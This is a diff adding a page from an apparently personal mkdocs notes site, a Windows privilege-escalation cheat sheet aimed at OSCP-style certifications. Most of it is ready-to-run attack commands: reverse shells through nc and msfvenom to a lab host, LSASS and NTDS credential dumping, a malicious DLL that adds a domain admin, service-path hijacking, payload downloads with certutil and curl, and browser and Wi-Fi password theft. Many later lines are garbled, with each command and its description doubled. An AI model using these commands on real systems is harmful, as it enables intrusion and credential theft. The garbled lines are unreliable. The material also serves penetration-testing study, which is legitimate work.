@@ -1,0 +1,719 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<link href="../Powershell%20Scripts/" rel="prev"/>
+<link href="../ToDo%20List/" rel="next"/>
+<link href="../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.4.2, mkdocs-material-9.0.6" name="generator"/>
+<title>Priv esc - obsidian-mkdocs template</title>
+<link href="../assets/stylesheets/main.558e4712.min.css" rel="stylesheet"/>
+<link href="../assets/stylesheets/palette.2505c338.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="indigo" data-md-color-primary="pink" data-md-color-scheme="default" dir="ltr">
+<script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml">
+          Skip to content
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="Header" class="md-header__inner md-grid">
+<a aria-label="obsidian-mkdocs template" class="md-header__button md-logo" data-md-component="logo" href=".." title="obsidian-mkdocs template">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            obsidian-mkdocs template
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              Priv esc
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="pink" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
+</label>
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="blue" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="pink" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"></path></svg>
+</label>
+</form>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg>
+</label>
+<nav aria-label="Search" class="md-search__options">
+<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg>
+</button>
+</nav>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Initializing search
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="obsidian-mkdocs template" class="md-nav__button md-logo" data-md-component="logo" href=".." title="obsidian-mkdocs template">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+    obsidian-mkdocs template
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="..">
+        Obsidian Notes
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../AD%20Rep%20Check/">
+        AD Rep Check
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../AD%20lateral%20movement%20%26%20Post%20exploitation/">
+        AD lateral movement &amp; Post exploitation
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Boot%20Rec%20Repair/">
+        Boot Rec Repair
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../CLI%20Stuff/">
+        CLI Stuff
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../FRS%20to%20DFSR%20Sysvol/">
+        FRS to DFSR Sysvol
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Fix%20Take%20Controll/">
+        Fix Take Controll
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Free%20RDP%20TLS%20Cert/">
+        Free RDP TLS Cert
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Hash%20dumping/">
+        Hash dumping
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Iperf%20Documentation/">
+        Iperf Documentation
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Markdown/">
+        Markdown Cheat Sheet
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Next%20Cloud%20Setup%20notes/">
+        Next Cloud Setup notes
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Obsidian/">
+        Obsidian
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Onsites/">
+        Onsites
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Pivoting%20and%20tunneling/">
+        Pivoting and Tunneling for OSCP and beyond (Cheat Sheet)
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Powershell%20Scripts/">
+        Powershell Scripts
+      </a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+          Priv esc
+          <span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+        Priv esc
+      </a>
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml">
+    Credential Theftfindstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../ToDo%20List/">
+        ToDo List
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../Xanmod/">
+        Xanmod
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../nmap/">
+        Nmap
+      </a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml">
+    Credential Theftfindstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
+  </a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1>Priv esc</h1>
+<p>This is a detailed cheat sheet for windows PE, its very handy in many certification like OSCP, OSCE and CRTE</p>
+<p><code>ipconfig /all</code></p>
+<blockquote>
+<p>Get interface, IP address and DNS information</p>
+</blockquote>
+<p><code>arp -a</code></p>
+<blockquote>
+<p>Review ARP table</p>
+</blockquote>
+<p><code>route print</code></p>
+<blockquote>
+<p>Review routing table</p>
+</blockquote>
+<p><code>Get-MpComputerStatus</code></p>
+<blockquote>
+<p>Check Windows Defender status</p>
+</blockquote>
+<p><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></p>
+<blockquote>
+<p>List AppLocker rules</p>
+</blockquote>
+<p><code>Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone</code></p>
+<blockquote>
+<p>Test AppLocker policy</p>
+</blockquote>
+<p><code>set</code></p>
+<blockquote>
+<p>Display all environment variables</p>
+</blockquote>
+<p><code>systeminfo</code></p>
+<blockquote>
+<p>View detailed system configuration information</p>
+</blockquote>
+<p><code>wmic qfe</code></p>
+<blockquote>
+<p>Get patches and updates</p>
+</blockquote>
+<p><code>wmic product get name</code></p>
+<blockquote>
+<p>Get installed programs</p>
+</blockquote>
+<p><code>tasklist /svc</code></p>
+<blockquote>
+<p>Display running processes</p>
+</blockquote>
+<p><code>query user</code></p>
+<blockquote>
+<p>Get logged-in users</p>
+</blockquote>
+<p><code>echo %USERNAME%</code></p>
+<blockquote>
+<p>Get current user</p>
+</blockquote>
+<p><code>whoami /priv</code></p>
+<blockquote>
+<p>View current user privileges</p>
+</blockquote>
+<p><code>whoami /groups</code></p>
+<blockquote>
+<p>View current user group information</p>
+</blockquote>
+<p><code>net user</code></p>
+<blockquote>
+<p>Get all system users</p>
+</blockquote>
+<p><code>net localgroup</code></p>
+<blockquote>
+<p>Get all system groups</p>
+</blockquote>
+<p><code>net localgroup administrators</code></p>
+<blockquote>
+<p>View details about a group</p>
+</blockquote>
+<p><code>net accounts</code></p>
+<blockquote>
+<p>Get passsword policy</p>
+</blockquote>
+<p><code>netstat -ano</code></p>
+<blockquote>
+<p>Display active network connections</p>
+</blockquote>
+<p><code>pipelist.exe /accepteula</code></p>
+<blockquote>
+<p>List named pipes</p>
+</blockquote>
+<p><code>gci \\.\pipe\</code></p>
+<blockquote>
+<p>List named pipes with PowerShell</p>
+</blockquote>
+<p><code>accesschk.exe /accepteula \\.\Pipe\lsass -v</code></p>
+<blockquote>
+<p>Review permissions on a named pipe</p>
+</blockquote>
+<p><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth</code></p>
+<blockquote>
+<p>Connect using mssqlclient.py</p>
+</blockquote>
+<p><code>enable_xp_cmdshell</code></p>
+<blockquote>
+<p>Enable xp_cmdshell with mssqlclient.py</p>
+</blockquote>
+<p><code>xp_cmdshell whoami</code></p>
+<blockquote>
+<p>Run OS commands with xp_cmdshell</p>
+</blockquote>
+<p><code>c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *</code></p>
+<blockquote>
+<p>Escalate privileges with JuicyPotato</p>
+</blockquote>
+<p><code>c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"</code></p>
+<blockquote>
+<p>Escalating privileges with PrintSpoofer</p>
+</blockquote>
+<p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
+<blockquote>
+<p>Take memory dump with ProcDump</p>
+</blockquote>
+<p><code>sekurlsa::minidump lsass.dmp</code> and <code>sekurlsa::logonpasswords</code></p>
+<blockquote>
+<p>Use MimiKatz to extract credentials from LSASS memory dump</p>
+</blockquote>
+<p><code>dir /q C:\backups\wwwroot\web.config</code></p>
+<blockquote>
+<p>Checking ownership of a file</p>
+</blockquote>
+<p><code>takeown /f C:\backups\wwwroot\web.config</code></p>
+<blockquote>
+<p>Taking ownership of a file</p>
+</blockquote>
+<p><code>Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}</code></p>
+<blockquote>
+<p>Confirming changed ownership of a file</p>
+</blockquote>
+<p><code>icacls “C:\backups\wwwroot\web.config” /grant lafi:F</code></p>
+<blockquote>
+<p>Modifying a file ACL</p>
+</blockquote>
+<p><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></p>
+<blockquote>
+<p>Extract hashes with secretsdump.py</p>
+</blockquote>
+<p><code>robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></p>
+<blockquote>
+<p>Copy files with ROBOCOPY</p>
+</blockquote>
+<p><code>wevtutil qe Security /rd:true /f:text | Select-String "/user"</code></p>
+<blockquote>
+<p>Searching security event logs</p>
+</blockquote>
+<p><code>wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></p>
+<blockquote>
+<p>Passing credentials to wevtutil</p>
+</blockquote>
+<p><code>Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code></p>
+<blockquote>
+<p>Searching event logs with PowerShell</p>
+</blockquote>
+<p><code>msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll</code></p>
+<blockquote>
+<p>Generate malicious DLL</p>
+</blockquote>
+<p><code>dnscmd.exe /config /serverlevelplugindll adduser.dll</code></p>
+<blockquote>
+<p>Loading a custom DLL with dnscmd</p>
+</blockquote>
+<p><code>wmic useraccount where name="netadm" get sid</code></p>
+<blockquote>
+<p>Finding a user's SID</p>
+</blockquote>
+<p><code>sc.exe sdshow DNS</code></p>
+<blockquote>
+<p>Checking permissions on DNS service</p>
+</blockquote>
+<p><code>sc stop dns</code></p>
+<blockquote>
+<p>Stopping a service</p>
+</blockquote>
+<p><code>sc start dns</code></p>
+<blockquote>
+<p>Starting a service</p>
+</blockquote>
+<p><code>reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</code></p>
+<blockquote>
+<p>Querying a registry key</p>
+</blockquote>
+<p><code>reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll</code></p>
+<blockquote>
+<p>Deleting a registry key</p>
+</blockquote>
+<p><code>sc query dns</code></p>
+<blockquote>
+<p>Checking a service status</p>
+</blockquote>
+<p><code>Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</code></p>
+<blockquote>
+<p>Disabling the global query block list</p>
+</blockquote>
+<p><code>Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3</code></p>
+<blockquote>
+<p>Adding a WPAD record</p>
+</blockquote>
+<p><code>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></p>
+<blockquote>
+<p>Compile with cl.exe</p>
+</blockquote>
+<p><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"</code></p>
+<blockquote>
+<p>Add reference to a driver (1)</p>
+</blockquote>
+<p><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></p>
+<blockquote>
+<p>Add reference to a driver (2)</p>
+</blockquote>
+<p><code>.\DriverView.exe /stext drivers.txt</code> and <code>cat drivers.txt | Select-String -pattern Capcom</code></p>
+<blockquote>
+<p>Check if driver is loaded</p>
+</blockquote>
+<p><code>EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys</code></p>
+<blockquote>
+<p>Using EopLoadDriver</p>
+</blockquote>
+<p><code>c:\Tools\PsService.exe security AppReadiness</code></p>
+<blockquote>
+<p>Checking service permissions with PsService</p>
+</blockquote>
+<p><code>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"</code></p>
+<blockquote>
+<p>Modifying a service binary path</p>
+</blockquote>
+<h2 id="credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml">Credential Theft<code>findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml</code><a class="headerlink" href="#credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>Search for files with the phrase "password"</p>
+</blockquote>
+<p><code>gc 'C:\Users\lafi\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password</code></p>
+<blockquote>
+<p>Searching for passwords in Chrome dictionary files</p>
+</blockquote>
+<p><code>(Get-PSReadLineOption).HistorySavePath</code></p>
+<blockquote>
+<p>Confirm PowerShell history save path</p>
+</blockquote>
+<p><code>gc (Get-PSReadLineOption).HistorySavePath</code></p>
+<blockquote>
+<p>Reading PowerShell history file</p>
+</blockquote>
+<p><code>$credential = Import-Clixml -Path 'C:\scripts\pass.xml'</code></p>
+<blockquote>
+<p>Decrypting PowerShell credentials</p>
+</blockquote>
+<p><code>cd c:\Users\lafi\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt</code></p>
+<blockquote>
+<p>Searching file contents for a string</p>
+</blockquote>
+<p><code>findstr /si password *.xml *.ini *.txt *.config</code></p>
+<blockquote>
+<p>Searching file contents for a string</p>
+</blockquote>
+<p><code>findstr /spin "password" *.*</code></p>
+<blockquote>
+<p>Searching file contents for a string</p>
+</blockquote>
+<p><code>select-string -Path C:\Users\lafi\Documents\*.txt -Pattern password</code></p>
+<blockquote>
+<p>Search file contents with PowerShell</p>
+</blockquote>
+<p><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</code></p>
+<blockquote>
+<p>Search for file extensions</p>
+</blockquote>
+<p><code>where /R C:\ *.config</code></p>
+<blockquote>
+<p>Search for file extensions</p>
+</blockquote>
+<p><code>Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></p>
+<blockquote>
+<p>Search for file extensions using PowerShell</p>
+</blockquote>
+<p><code>cmdkey /list</code></p>
+<blockquote>
+<p>List saved credentials</p>
+</blockquote>
+<p><code>.\SharpChrome.exe logins /unprotect</code></p>
+<blockquote>
+<p>Retrieve saved Chrome credentials</p>
+</blockquote>
+<p><code>.\lazagne.exe -h</code></p>
+<blockquote>
+<p>View LaZagne help menu</p>
+</blockquote>
+<p><code>.\lazagne.exe all</code></p>
+<blockquote>
+<p>Run all LaZagne modules</p>
+</blockquote>
+<p><code>Invoke-SessionGopher -Target WINLPE-SRV01</code></p>
+<blockquote>
+<p>Running SessionGopher</p>
+</blockquote>
+<p><code>netsh wlan show profile</code></p>
+<blockquote>
+<p>View saved wireless networks</p>
+</blockquote>
+<p><code>netsh wlan show profile ilfreight_corp key=clear</code></p>
+<blockquote>
+<p>Retrieve saved wireless passwords</p>
+</blockquote>
+<p><code>certutil.exe -urlcache -split -f [http://10.10.14.3:8080/shell.bat](http://10.10.14.3:8080/shell.bat) shell.bat</code></p>
+<blockquote>
+<p>Transfer file with certutil</p>
+</blockquote>
+<p><code>certutil -encode file1 encodedfile</code></p>
+<blockquote>
+<p>Encode file with certutil</p>
+</blockquote>
+<p><code>certutil -decode encodedfile file2</code></p>
+<blockquote>
+<p>Decode file with certutil</p>
+</blockquote>
+<p><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code></p>
+<blockquote>
+<p>Query for always install elevated registry key (1)</p>
+</blockquote>
+<p><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></p>
+<blockquote>
+<p>Query for always install elevated registry key (2)</p>
+</blockquote>
+<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</code></p>
+<blockquote>
+<p>Generate a malicious MSI package</p>
+</blockquote>
+<p><code>msiexec /i c:\users\lafi\desktop\aie.msi /quiet /qn /norestart</code></p>
+<blockquote>
+<p>Executing an MSI package from command line</p>
+</blockquote>
+<p><code>schtasks /query /fo LIST /v</code></p>
+<blockquote>
+<p>Enumerate scheduled tasks</p>
+</blockquote>
+<p><code>Get-ScheduledTask | select TaskName,State</code></p>
+<blockquote>
+<p>Enumerate scheduled tasks with PowerShell</p>
+</blockquote>
+<p><code>.\accesschk64.exe /accepteula -s -d C:\Scripts\</code></p>
+<blockquote>
+<p>Check permissions on a directory</p>
+</blockquote>
+<p><code>Get-LocalUser</code></p>
+<blockquote>
+<p>Check local user description field</p>
+</blockquote>
+<p><code>Get-WmiObject -Class Win32_OperatingSystem | select Description</code></p>
+<blockquote>
+<p>Enumerate computer description field</p>
+</blockquote>
+<p><code>guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</code></p>
+<blockquote>
+<p>Mount VMDK on Linux</p>
+</blockquote>
+<p><code>guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</code></p>
+<blockquote>
+<p>Mount VHD/VHDX on Linux</p>
+</blockquote>
+<p><code>sudo python2.7 windows-exploit-suggester.py --update</code></p>
+<blockquote>
+<p>Update Windows Exploit Suggester database</p>
+</blockquote>
+<p><code>python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</code></p>
+<blockquote>
+<p>Running Windows Exploit Suggester</p>
+</blockquote>
+<p>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUAREG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA</p>
+<blockquote>
+<p>Confirming UAC is enabledConfirming UAC is enabled</p>
+</blockquote>
+<p>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdminREG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</p>
+<blockquote>
+<p>Checking UAC levelChecking UAC level</p>
+</blockquote>
+<p><code>[environment]::OSVersion.Version``[environment]::OSVersion.Version</code></p>
+<blockquote>
+<p>Checking Windows versionChecking Windows version</p>
+</blockquote>
+<p><code>cmd /c echo %PATH%``cmd /c echo %PATH%</code></p>
+<blockquote>
+<p>Reviewing path variableReviewing path variable</p>
+</blockquote>
+<p><code>.\SharpUp.exe audit``.\SharpUp.exe audit</code></p>
+<blockquote>
+<p>Running SharpUpRunning SharpUp</p>
+</blockquote>
+<p><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"``icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></p>
+<blockquote>
+<p>Checking service permissions with icaclsChecking service permissions with icacls</p>
+</blockquote>
+<p><code>cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"``cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></p>
+<blockquote>
+<p>Replace a service binaryReplace a service binary</p>
+</blockquote>
+<p><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """``wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></p>
+<blockquote>
+<p>Searching for unquoted service pathsSearching for unquoted service paths</p>
+</blockquote>
+<p><code>accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services``accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services</code></p>
+<blockquote>
+<p>Checking for weak service ACLs in the RegistryChecking for weak service ACLs in the Registry</p>
+</blockquote>
+<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"``Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></p>
+<blockquote>
+<p>Changing ImagePath with PowerShellChanging ImagePath with PowerShell</p>
+</blockquote>
+<p><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl``Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></p>
+<blockquote>
+<p>Check startup programsCheck startup programs</p>
+</blockquote>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe``msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</code></p>
+<blockquote>
+<p>Generating a malicious binaryGenerating a malicious binary</p>
+</blockquote>
+<p><code>get-process -Id 3324``get-process -Id 3324</code></p>
+<blockquote>
+<p>Enumerating a process ID with PowerShellEnumerating a process ID with PowerShell</p>
+</blockquote>
+<p><code>get-service | ? {$_.DisplayName -like 'Druva*'}``get-service | ? {$_.DisplayName -like 'Druva*'}</code></p>
+<blockquote>
+<p>Enumerate a running service by name with PowerShellEnumerate a running service by name with PowerShell</p>
+</blockquote>
+<p><code>curl http ://10.10.14.3:8080/srrstr.dll -O "C:\Users\lafi\AppData\Local\Microsoft\WindowsApps\srrstr.dll"</code></p>
+<blockquote>
+<p>Downloading file with cURL in PowerShell</p>
+</blockquote>
+<p><code>rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll</code></p>
+<blockquote>
+<p>Executing custom dll with rundll32.exe</p>
+</blockquote>
+</article>
+</div>
+</div>
+</main>
